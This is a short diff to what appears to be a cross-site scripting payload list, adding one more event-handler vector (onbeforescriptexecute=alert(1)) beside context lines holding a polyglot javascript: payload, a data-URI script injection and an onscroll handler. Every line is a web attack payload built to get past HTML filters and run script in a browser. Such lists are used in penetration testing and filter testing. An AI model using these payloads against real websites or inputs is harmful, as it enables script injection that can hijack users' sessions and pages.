@@ -1208,3 +1208,4 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 <!><!----><?></>
 <a href="data:　, &lt &NewLine; script &gt alert(1) &lt /script &gt ">CLICK
 <div style=overflow:-webkit-marquee onscroll=alert(1)>
+<b onbeforescriptexecute=alert(1)>
